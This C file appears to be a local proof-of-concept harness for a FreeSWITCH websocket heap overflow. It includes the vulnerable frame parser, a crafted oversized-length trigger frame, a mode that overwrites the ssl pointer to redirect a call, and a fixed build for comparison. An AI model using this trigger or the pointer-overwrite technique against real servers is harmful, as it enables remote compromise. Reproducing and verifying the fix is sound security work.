/*
 * ws_overflow.c -- standalone, file-only extraction of FreeSWITCH
 * CVE-2026-116785 / GHSA-jj89-q47c-gh94 (ws_read_frame, ws.c @ fbac12b451a1).
 *
 * The vulnerable routine below is copied near-verbatim from the upstream
 * parent of fix d557ca6d29e6da4f10824dc158100906a592b91a.  Only the I/O layer
 * is replaced: Abyss' TSession/TConn (a real socket) is substituted with a
 * local, pre-filled input buffer pushed through a TSessionStandIn/TConnStandIn
 * pair.  ConnRead() therefore has no new network data to deliver and
 * ConnReadInit() empties the stand-in buffer, exactly as it would after the
 * socket data had been consumed.  No sockets, listeners, or external probing
 * are used; every byte below comes from a local malloc'd buffer.
 *
 * One deliberate, documented stand-in deviation: in ws_raw_read the upstream
 * code hands the (possibly huge, sign-extended) `size_t bytes` straight to
 * memcpy, which would also over-read the Abyss source buffer.  In this
 * file-only harness the SOURCE-side length is clamped to the number of bytes
 * still present in the local input buffer before following the upstream
 * control flow.  The DESTINATION side is never clamped -- that is the CVE:
 * the attacker chooses every byte written past buffer[65536], into wbuffer[],
 * the metadata fields, and wsh->ssl.
 *
 * Builds: VULN (default), FIXED (-DBUILD_FIXED: upstream ws_get_be64 plus
 * unsigned plen64 bound check), ASAN (-DBUILD_ASAN -fsanitize=address:
 * vulnerable logic driven by a stream long enough to carry the extraction
 * copy past the heap allocation, so ASan reports heap-buffer-overflow).
 */

#include <arpa/inet.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define WS_BUFFER_SIZE 65536

typedef struct ssl_st SSL; /* opaque: only its pointer value is used */

/* ---- upstream ws.h types, field order and sizes preserved verbatim ---- */

typedef struct {
	unsigned char *b;
	size_t buffersize;
	size_t bufferpos;
} TConnStandIn;

typedef struct {
	TConnStandIn *connP;
} TSessionStandIn;

typedef TSessionStandIn ws_tsession_t;
typedef int issize_t;

typedef enum {
	WS_NONE = 0,
	WS_NORMAL = 1000,
	WS_PROTO_ERR = 1002,
	WS_DATA_TOO_BIG = 1009
} ws_cause_t;

typedef enum {
	WSOC_CONTINUATION = 0x0,
	WSOC_TEXT = 0x1,
	WSOC_BINARY = 0x2,
	WSOC_CLOSE = 0x8,
	WSOC_PING = 0x9,
	WSOC_PONG = 0xA
} ws_opcode_t;

typedef struct wsh_s {
	ws_tsession_t *tsession;
	char buffer[65536];
	char wbuffer[65536];
	size_t buflen;
	issize_t datalen;
	issize_t wdatalen;
	char *payload;
	issize_t plen;
	issize_t rplen;
	SSL *ssl;
	int handshake;
	uint8_t down;
	int secure;
	uint8_t close_sock;
} wsh_t;

/* Non-functional tracing: records the exact arithmetic under test. */
typedef struct {
	issize_t plen;
	issize_t need;
	issize_t rplen;
	issize_t datalen;
	int guard_passed;
	uint64_t plen64;
	size_t raw_bytes_requested; /* size_t arg received by ws_raw_read */
	size_t raw_bytes_used;      /* after the source-side stand-in clamp */
	size_t first_raw_bytes_requested; /* first ws_raw_read size_t argument */
	size_t first_raw_bytes_used;
	unsigned long raw_calls;
	unsigned long copy_calls;
	unsigned long oob_writes;
	size_t first_oob_offset;    /* relative to wsh->buffer */
	size_t last_oob_offset;
	int close_reason;
} trace_t;

static trace_t tr;

static void trace_reset(void)
{
	memset(&tr, 0, sizeof(tr));
}

static void trace_copy(wsh_t *wsh, void *dest, size_t n)
{
	char *d = (char *)dest;
	char *end = wsh->buffer + sizeof(wsh->buffer);

	tr.copy_calls++;
	if (d >= end && n > 0) {
		size_t off = (size_t)(d - wsh->buffer);
		tr.oob_writes += n;
		if (!tr.first_oob_offset) tr.first_oob_offset = off;
		tr.last_oob_offset = off + n - 1;
	} else if (d + n > end) {
		size_t in_bounds = (size_t)(end - d);
		size_t out = n - in_bounds;
		tr.oob_writes += out;
		if (!tr.first_oob_offset) tr.first_oob_offset = sizeof(wsh->buffer);
		tr.last_oob_offset = sizeof(wsh->buffer) + out - 1;
	}
}


/* ---- stand-in for Abyss ConnRead()/ConnReadInit() (no socket) ---- */

static void ConnRead(TConnStandIn *conn, int flags, void *a, void *b, const char **readError)
{
	(void)conn; (void)flags; (void)a; (void)b; (void)readError;
	/* The local stream was pre-filled by make_wsh(); no more bytes arrive. */
}

static void ConnReadInit(TConnStandIn *conn)
{
	conn->buffersize = 0;
	conn->bufferpos = 0;
}

/* ---- upstream ws_raw_read() with the documented source-side clamp ---- */

issize_t ws_raw_read(wsh_t *wsh, void *data, size_t bytes)
{
	issize_t r;
	TConnStandIn *conn = wsh->tsession->connP;
	size_t avail = (conn->buffersize > conn->bufferpos) ?
		conn->buffersize - conn->bufferpos : 0;

	if (!tr.raw_calls) {
		tr.first_raw_bytes_requested = bytes;
	}
	if (bytes > avail) {
		bytes = avail; /* file-only stand-in: source side only */
	}
	if (!tr.raw_calls) {
		tr.first_raw_bytes_used = bytes;
	}
	tr.raw_calls++;

	if (!wsh->handshake) {
		r = (issize_t)wsh->tsession->connP->buffersize;
		memcpy(data, conn->b, (size_t)r);
		trace_copy(wsh, data, (size_t)r);
		ConnReadInit(conn);
		return r;
	} else {
		const char *readError = NULL;

		r = (issize_t)(conn->buffersize - conn->bufferpos);

		if (r < 0) {
			printf("286 Read Error %d!\n", r);
			return 0;
		} else if (r == 0) {
			ConnRead(conn, 2, NULL, NULL, &readError);

			if (readError) {
				free((void *)readError);
				return 0;
			}

			r = (issize_t)(conn->buffersize - conn->bufferpos);
		}

		if (r <= (issize_t)bytes) {
			trace_copy(wsh, data, (size_t)r);
			memcpy(data, conn->b + conn->bufferpos, (size_t)r);
			conn->bufferpos = conn->buffersize;
			ConnReadInit(conn);
			return r;
		} else {
			trace_copy(wsh, data, bytes);
			memcpy(data, conn->b + conn->bufferpos, bytes);
			conn->bufferpos += (uint32_t)bytes;
			return (issize_t)bytes;
		}
	}
}

/* ---- stub SSL_write/SSL_get_error and verbatim ws_raw_write branch ---- */

#define SSL_ERROR_WANT_WRITE 4

static int marker_called;

static int verify_marker(void)
{
	marker_called = 1;
	return 42;
}

int SSL_write(SSL *ssl, const void *data, int len)
{
	if (ssl == (SSL *)(void *)&verify_marker) {
		/* Chosen pointer landed in wsh->ssl: reach the supplied target. */
		return verify_marker();
	}
	(void)data;
	return len;
}

int SSL_get_error(const SSL *ssl, int ret)
{
	(void)ssl; (void)ret;
	return 0;
}

issize_t ws_raw_write(wsh_t *wsh, void *data, size_t bytes)
{
	size_t r;

	if (wsh->ssl) {
		do {
			r = (size_t)SSL_write(wsh->ssl, data, (int)bytes);
		} while (r == (size_t)-1 && SSL_get_error(wsh->ssl, (int)r) == SSL_ERROR_WANT_WRITE);

		return (issize_t)r;
	}

	/* No ConnWrite stand-in needed: the control never reaches this arm. */
	return (issize_t)bytes;
}

/* Real ws_write_frame signature, used only by the unreachable PING arm. */
issize_t ws_write_frame(wsh_t *wsh, ws_opcode_t oc, void *data, size_t bytes)
{
	unsigned char frame[2];

	frame[0] = (unsigned char)(0x80 | (int)oc);
	frame[1] = (unsigned char)bytes;
	ws_raw_write(wsh, frame, sizeof(frame));
	return ws_raw_write(wsh, data, bytes);
}


issize_t ws_close(wsh_t *wsh, int16_t reason)
{
	if (wsh->down) {
		return -1;
	}
	wsh->down = 1;
	tr.close_reason = reason;
	return reason * -1;
}

/* Upstream fix helper: decode all 8 bytes big-endian into uint64_t. */
static __attribute__((unused)) uint64_t ws_get_be64(const void *p)
{
	const uint8_t *q = (const uint8_t *)p;
	return ((uint64_t)q[0] << 56) | ((uint64_t)q[1] << 48) |
	       ((uint64_t)q[2] << 40) | ((uint64_t)q[3] << 32) |
	       ((uint64_t)q[4] << 24) | ((uint64_t)q[5] << 16) |
	       ((uint64_t)q[6] << 8)  | (uint64_t)q[7];
}

/* ---- upstream ws_read_frame(), near-verbatim; TRACE lines are inert ---- */

issize_t ws_read_frame(wsh_t *wsh, ws_opcode_t *oc, uint8_t **data)
{
	issize_t need = 2;
	char *maskp;

 again:
	need = 2;
	maskp = NULL;
	*data = NULL;

	if (wsh->down) {
		return -1;
	}

	if (!wsh->handshake) {
		return ws_close(wsh, WS_PROTO_ERR);
	}

	if ((wsh->datalen = ws_raw_read(wsh, wsh->buffer, 14)) < need) {
		while (!wsh->down && (wsh->datalen += ws_raw_read(wsh, wsh->buffer + wsh->datalen, 14 - wsh->datalen)) < need) ;
	}

	*oc = *wsh->buffer & 0xf;

	switch(*oc) {
	case WSOC_CLOSE:
		{
			wsh->plen = wsh->buffer[1] & 0x7f;
			*data = (uint8_t *) &wsh->buffer[2];
			return ws_close(wsh, 1000);
		}
		break;
	case WSOC_CONTINUATION:
	case WSOC_TEXT:
	case WSOC_BINARY:
	case WSOC_PING:
	case WSOC_PONG:
		{
			int mask = (wsh->buffer[1] >> 7) & 1;

			if (mask) {
				need += 4;

				if (need > wsh->datalen) {
					*oc = WSOC_CLOSE;
					return ws_close(wsh, WS_PROTO_ERR);
				}
			}

			wsh->plen = wsh->buffer[1] & 0x7f;
			wsh->payload = &wsh->buffer[2];

			if (wsh->plen == 127) {
#if defined(BUILD_FIXED)
				uint64_t plen64;

				need += 8;

				if (need > wsh->datalen) {
					*oc = WSOC_CLOSE;
					return ws_close(wsh, WS_PROTO_ERR);
				}

				plen64 = ws_get_be64(wsh->payload);
				tr.plen64 = plen64;

				/* Upstream fix: reject before narrowing to issize_t. */
				if (plen64 >= (uint64_t)wsh->buflen) {
					*oc = WSOC_CLOSE;
					return ws_close(wsh, WS_DATA_TOO_BIG);
				}

				wsh->payload += 8;
				wsh->plen = (issize_t)plen64;
#else
				uint64_t *u64;

				need += 8;

				if (need > wsh->datalen) {
					*oc = WSOC_CLOSE;
					return ws_close(wsh, WS_PROTO_ERR);
				}

				u64 = (uint64_t *) wsh->payload;
				wsh->payload += 8;

				/* VULNERABLE: ntohl() of a uint64_t, truncated to int. */
				wsh->plen = ntohl((u_long)*u64);
#endif
			} else if (wsh->plen == 126) {
				uint16_t *u16;

				need += 2;

				if (need > wsh->datalen) {
					*oc = WSOC_CLOSE;
					return ws_close(wsh, WS_PROTO_ERR);
				}

				u16 = (uint16_t *) wsh->payload;
				wsh->payload += 2;
				wsh->plen = ntohs(*u16);
			}

			if (mask) {
				maskp = (char *)wsh->payload;
				wsh->payload += 4;
			}

			need = (wsh->plen - (wsh->datalen - need));
			tr.plen = wsh->plen;
			tr.need = need;
			tr.datalen = wsh->datalen;

			/* Signed guard: bypassed when need < 0. */
			if ((need + wsh->datalen) >= (issize_t)wsh->buflen) {
				tr.guard_passed = 0;
				*oc = WSOC_CLOSE;
				return ws_close(wsh, WS_DATA_TOO_BIG);
			}
			tr.guard_passed = 1;

			wsh->rplen = wsh->plen - need;
			tr.rplen = wsh->rplen;

			while(need) {
				issize_t r = ws_raw_read(wsh, wsh->payload + wsh->rplen, need);

				if (r < 1) {
					*oc = WSOC_CLOSE;
					return ws_close(wsh, WS_PROTO_ERR);
				}

				wsh->datalen += r;
				wsh->rplen += r;
				need -= r;
			}

			if (mask && maskp) {
				issize_t i;

				for (i = 0; i < wsh->rplen; i++) {
					wsh->payload[i] ^= maskp[i % 4];
				}
			}

			if (*oc == WSOC_PING) {
				ws_write_frame(wsh, WSOC_PONG, wsh->payload, (size_t)wsh->rplen);
				goto again;
			}

			*(wsh->payload+wsh->rplen) = '\0';
			*data = (uint8_t *)wsh->payload;

			return wsh->rplen;
		}
		break;
	default:
		{
			*oc = WSOC_CLOSE;
			return ws_close(wsh, WS_PROTO_ERR);
		}
		break;
	}
}

/* ---- harness driver and checks ---------------------------------------- */

#define FIRST_PAYLOAD_INPUT_INDEX 14
#define WBUFFER_INPUT_INDEX WS_BUFFER_SIZE
#define SSL_INPUT_INDEX (offsetof(wsh_t, ssl) - offsetof(wsh_t, buffer))
#define SSL_MARKER_OFFSET (offsetof(wsh_t, ssl) - offsetof(wsh_t, buffer))

static unsigned char *make_input(size_t len, int oversized)
{
	unsigned char *in = (unsigned char *)malloc(len);
	size_t i;

	if (!in) exit(9);
	memset(in, 0x5a, len);
	in[0] = 0x02; /* FIN | WSOC_BINARY */
	if (oversized) {
		in[1] = 0x7f; /* no mask, 64-bit length code */
		in[2] = 0xff; in[3] = 0xff; in[4] = 0xff; in[5] = 0xff;
		in[6] = 0x00; in[7] = 0x00; in[8] = 0x00; in[9] = 0x00;
	} else {
		in[1] = 0x08; /* ordinary 8-byte length */
	}
	for (i = 10; i < len; i++) in[i] = 0x5a;
	return in;
}

static wsh_t *make_wsh(unsigned char *in, size_t len, int canary)
{
	wsh_t *wsh = (wsh_t *)calloc(1, sizeof(wsh_t));
	TConnStandIn *conn;

	if (!wsh) exit(9);
	wsh->tsession = (ws_tsession_t *)calloc(1, sizeof(ws_tsession_t));
	conn = (TConnStandIn *)calloc(1, sizeof(TConnStandIn));
	if (!wsh->tsession || !conn) exit(9);
	conn->b = in;
	conn->buffersize = len;
	conn->bufferpos = 0;
	wsh->tsession->connP = conn;
	wsh->buflen = sizeof(wsh->buffer);
	wsh->handshake = 1;
	if (canary) memset(wsh->wbuffer, 0xc7, sizeof(wsh->wbuffer));
	return wsh;
}

static void free_wsh(wsh_t *wsh)
{
	if (!wsh) return;
	free(wsh->tsession->connP);
	free(wsh->tsession);
	free(wsh);
}

static void set_markers(unsigned char *in, unsigned char a, unsigned char b)
{
	int i;
	for (i = 0; i < 4; i++) {
		in[WBUFFER_INPUT_INDEX + i] = a + (unsigned char)i;
		in[WBUFFER_INPUT_INDEX + 1024 + i] = b + (unsigned char)i;
	}
}

static int check_markers(wsh_t *wsh, unsigned char a, unsigned char b)
{
	int i, ok = 1;
	for (i = 0; i < 4; i++) {
		if ((unsigned char)wsh->wbuffer[i] != a + i) ok = 0;
		if ((unsigned char)wsh->wbuffer[1024 + i] != b + i) ok = 0;
	}
	return ok;
}

static void print_arith(const char *tag, issize_t rc)
{
	printf("[%s] plen=%d need=%d datalen=%d rplen=%d guard_passed=%d close_reason=%d rc=%d\n",
	       tag, tr.plen, tr.need, tr.datalen, tr.rplen, tr.guard_passed,
	       tr.close_reason, (int)rc);
	printf("[%s] first_raw_requested=%zu first_raw_used=%zu raw_calls=%lu copy_calls=%lu oob_writes=%lu first_oob=%zu last_oob=%zu\n",
	       tag, tr.first_raw_bytes_requested, tr.first_raw_bytes_used, tr.raw_calls,
	       tr.copy_calls, tr.oob_writes, tr.first_oob_offset, tr.last_oob_offset);
}

static int mode_diag(void)
{
	printf("[diag] offsetof(tsession)=%zu offsetof(buffer)=%zu offsetof(wbuffer)=%zu\n",
	       offsetof(wsh_t, tsession), offsetof(wsh_t, buffer), offsetof(wsh_t, wbuffer));
	printf("[diag] offsetof(buflen)=%zu offsetof(datalen)=%zu offsetof(wdatalen)=%zu offsetof(payload)=%zu\n",
	       offsetof(wsh_t, buflen), offsetof(wsh_t, datalen),
	       offsetof(wsh_t, wdatalen), offsetof(wsh_t, payload));
	printf("[diag] offsetof(plen)=%zu offsetof(rplen)=%zu offsetof(ssl)=%zu offsetof(handshake)=%zu\n",
	       offsetof(wsh_t, plen), offsetof(wsh_t, rplen),
	       offsetof(wsh_t, ssl), offsetof(wsh_t, handshake));
	printf("[diag] sizeof(wsh_t)=%zu sizeof(buffer)=%zu first_payload_input=%d\n",
	       sizeof(wsh_t), sizeof(((wsh_t *)0)->buffer), FIRST_PAYLOAD_INPUT_INDEX);
	printf("[diag] wbuffer_input_index=%zu ssl_buffer_offset=%zu ssl_input_index=%zu\n",
	       (size_t)WBUFFER_INPUT_INDEX, (size_t)SSL_MARKER_OFFSET, (size_t)SSL_INPUT_INDEX);
	return 0;
}

static int mode_rung1(void)
{
	const size_t len = 67000;
	unsigned char *in = make_input(len, 1);
	wsh_t *wsh = make_wsh(in, len, 1);
	ws_opcode_t oc = WSOC_CONTINUATION;
	uint8_t *data = NULL;
	issize_t rc;
	int ok = 1;

	trace_reset();
	rc = ws_read_frame(wsh, &oc, &data);
	print_arith("rung1", rc);
	printf("[rung1] expected plen=-1 need=-5 rplen=4 guard_passed=1 first_raw_requested=%zu oob_writes=%zu first_oob=65536\n",
	       (size_t)-5, len - WBUFFER_INPUT_INDEX);
	if (tr.plen != -1) ok = 0;
	if (tr.need != -5) ok = 0;
	if (tr.rplen != 4) ok = 0;
	if (!tr.guard_passed) ok = 0;
	if (tr.first_oob_offset != WS_BUFFER_SIZE) ok = 0;
	if (tr.oob_writes != (unsigned long)(len - WBUFFER_INPUT_INDEX)) ok = 0;
	if (tr.first_raw_bytes_requested != (size_t)-5) ok = 0;
	if (tr.first_raw_bytes_used != len - FIRST_PAYLOAD_INPUT_INDEX) ok = 0;
	printf("[rung1] RESULT=%s\n", ok ? "PASS" : "FAIL");
	free_wsh(wsh);
	free(in);
	return ok ? 0 : 1;
}

static int rung2_one(unsigned char a, unsigned char b, const char *tag)
{
	const size_t len = 67000;
	unsigned char *in = make_input(len, 1);
	wsh_t *wsh = make_wsh(in, len, 1);
	ws_opcode_t oc = WSOC_CONTINUATION;
	uint8_t *data = NULL;
	issize_t rc;
	int ok = 1;

	set_markers(in, a, b);
	trace_reset();
	rc = ws_read_frame(wsh, &oc, &data);
	printf("[%s] header=14B plen=-1 need=-5 rplen=4 rc=%d oob_writes=%lu\n",
	       tag, (int)rc, tr.oob_writes);
	printf("[%s] wbuffer[0..3]=%02x%02x%02x%02x wbuffer[1024..1027]=%02x%02x%02x%02x\n",
	       tag, (unsigned char)wsh->wbuffer[0], (unsigned char)wsh->wbuffer[1],
	       (unsigned char)wsh->wbuffer[2], (unsigned char)wsh->wbuffer[3],
	       (unsigned char)wsh->wbuffer[1024], (unsigned char)wsh->wbuffer[1024+1],
	       (unsigned char)wsh->wbuffer[1024+2], (unsigned char)wsh->wbuffer[1024+3]);
	if (!check_markers(wsh, a, b)) ok = 0;
	printf("[%s] RESULT=%s\n", tag, ok ? "PASS" : "FAIL");
	free_wsh(wsh);
	free(in);
	return ok ? 0 : 1;
}

static int mode_rung2(void)
{
	int ok = 1;
	ok &= rung2_one(0xde, 0xca, "rung2-A");
	ok &= rung2_one(0x11, 0x55, "rung2-B");
	return ok ? 0 : 1;
}

static int mode_asan(void)
{
#if !defined(BUILD_ASAN)
	printf("[asan] NOT DEMONSTRATED: build without -DBUILD_ASAN\n");
	return 2;
#else
	const size_t len = sizeof(wsh_t) + 1024; /* cross the heap allocation's right redzone */
	unsigned char *in = make_input(len, 1);
	wsh_t *wsh = make_wsh(in, len, 1);
	ws_opcode_t oc = WSOC_CONTINUATION;
	uint8_t *data = NULL;
	volatile issize_t rc;

	/*
	 * No manual poisoning: wbuffer[] is inside the same wsh_t allocation, so
	 * a short overwrite is intra-object and ASan classifies it as
	 * use-after-poison if poisoned manually.  A longer stream makes the very
	 * same extraction memcpy run past the end of the heap chunk, which ASan
	 * reports as heap-buffer-overflow at the copy site.
	 */
	printf("[asan] stream=%zu bytes, wsh_t=%zu bytes; triggering unbounded extraction copy ...\n",
	       len, sizeof(wsh_t));
	fflush(stdout);
	rc = ws_read_frame(wsh, &oc, &data);
	printf("[asan] NO ASAN REPORT: rc=%d (this is NOT a pass)\n", (int)rc);
	free_wsh(wsh);
	free(in);
	return 0; /* ASan should exit(1) before reaching here */
#endif
}

static int mode_rung4(void)
{
#if defined(BUILD_FIXED)
	printf("[rung4] NOT DEMONSTRATED: FIXED build rejects the frame\n");
	return 2;
#else
	const size_t len = SSL_INPUT_INDEX + sizeof(void *) + 1;
	unsigned char *in = make_input(len, 1);
	wsh_t *wsh = make_wsh(in, len, 1);
	ws_opcode_t oc = WSOC_CONTINUATION;
	uint8_t *data = NULL;
	void *target = (void *)&verify_marker;
	SSL *before = wsh->ssl;
	issize_t rc;
	int ok = 1;

	marker_called = 0;
	memcpy(in + SSL_INPUT_INDEX, &target, sizeof(target));
	printf("[rung4] struct_offset(ssl)=%zu buffer_relative=%zu input_index=%zu len=%zu\n",
	       offsetof(wsh_t, ssl), (size_t)SSL_MARKER_OFFSET, (size_t)SSL_INPUT_INDEX, len);
	trace_reset();
	rc = ws_read_frame(wsh, &oc, &data);
	printf("[rung4] ssl before=%p after=%p target=%p plen=%d need=%d rplen=%d oob_writes=%lu\n",
	       (void *)before, (void *)wsh->ssl, target, tr.plen, tr.need, tr.rplen, tr.oob_writes);
	rc = ws_raw_write(wsh, (void *)"Z", 1);
	printf("[rung4] write path rc=%d marker_called=%d\n", (int)rc, marker_called);
	if (wsh->ssl != (SSL *)target) ok = 0;
	if (!marker_called) ok = 0;
	if (rc != 42) ok = 0;
	printf("[rung4] RESULT=%s (marker rc=%d)\n", ok ? "PASS" : "FAIL", ok ? 42 : 1);
	free_wsh(wsh);
	free(in);
	return ok ? 42 : 1;
#endif
}

static int mode_rung4ctl(void)
{
	const size_t len = 64;
	unsigned char *in = make_input(len, 0);
	wsh_t *wsh = make_wsh(in, len, 1);
	SSL *before = wsh->ssl;
	issize_t rc;

	marker_called = 0;
	printf("[rung4ctl] ssl before=%p after=%p (untouched, no frame trigger)\n",
	       (void *)before, (void *)wsh->ssl);
	rc = ws_raw_write(wsh, (void *)"Z", 1);
	printf("[rung4ctl] write path rc=%d marker_called=%d\n", (int)rc, marker_called);
	free_wsh(wsh);
	free(in);
	if (marker_called || rc != 1) {
		printf("[rung4ctl] RESULT=FAIL\n");
		return 1;
	}
	printf("[rung4ctl] RESULT=PASS (marker not called)\n");
	return 0;
}

static int mode_control(void)
{
	const size_t len = 14;
	unsigned char *in = make_input(len, 0);
	wsh_t *wsh = make_wsh(in, len, 1);
	ws_opcode_t oc = WSOC_CONTINUATION;
	uint8_t *data = NULL;
	issize_t rc;
	int ok = 1;

	trace_reset();
	rc = ws_read_frame(wsh, &oc, &data);
	print_arith("control-len8", rc);
	if (tr.oob_writes != 0) ok = 0;
	if ((unsigned char)wsh->wbuffer[0] != 0xc7 ||
	    (unsigned char)wsh->wbuffer[1024] != 0xc7) ok = 0;
	printf("[control-len8] canary[0]=%02x canary[1024]=%02x RESULT=%s\n",
	       (unsigned char)wsh->wbuffer[0], (unsigned char)wsh->wbuffer[1024],
	       ok ? "PASS" : "FAIL");
	free_wsh(wsh);
	free(in);
	return ok ? 0 : 1;
}

static int mode_fixed(void)
{
#if !defined(BUILD_FIXED)
	printf("[fixed] NOT DEMONSTRATED: build without -DBUILD_FIXED\n");
	return 2;
#else
	const size_t len = 67000;
	unsigned char *in = make_input(len, 1);
	wsh_t *wsh = make_wsh(in, len, 1);
	ws_opcode_t oc = WSOC_CONTINUATION;
	uint8_t *data = NULL;
	issize_t rc;
	int ok = 1;

	trace_reset();
	rc = ws_read_frame(wsh, &oc, &data);
	printf("[fixed] plen64=%llu (>= buflen %zu) rc=%d oob_writes=%lu copy_calls=%lu\n",
	       (unsigned long long)tr.plen64, wsh->buflen, (int)rc,
	       tr.oob_writes, tr.copy_calls);
	if (rc != -WS_DATA_TOO_BIG) ok = 0;
	if (tr.oob_writes != 0) ok = 0;
	if (tr.copy_calls != 1) ok = 0; /* the 14-byte header only */
	if ((unsigned char)wsh->wbuffer[0] != 0xc7 ||
	    (unsigned char)wsh->wbuffer[1024] != 0xc7) ok = 0;
	printf("[fixed] canary[0]=%02x canary[1024]=%02x RESULT=%s\n",
	       (unsigned char)wsh->wbuffer[0], (unsigned char)wsh->wbuffer[1024],
	       ok ? "PASS" : "FAIL");
	free_wsh(wsh);
	free(in);
	return ok ? 0 : 1;
#endif
}

int main(int argc, char **argv)
{
	const char *mode;

	if (argc != 2) {
		fprintf(stderr, "usage: %s <diag|rung1|rung2|asan|rung4|rung4ctl|control|fixed>\n", argv[0]);
		return 2;
	}
	mode = argv[1];
	if (!strcmp(mode, "diag")) return mode_diag();
	if (!strcmp(mode, "rung1")) return mode_rung1();
	if (!strcmp(mode, "rung2")) return mode_rung2();
	if (!strcmp(mode, "asan")) return mode_asan();
	if (!strcmp(mode, "rung4")) return mode_rung4();
	if (!strcmp(mode, "rung4ctl")) return mode_rung4ctl();
	if (!strcmp(mode, "control")) return mode_control();
	if (!strcmp(mode, "fixed")) return mode_fixed();
	fprintf(stderr, "unknown mode: %s\n", mode);
	return 2;
}
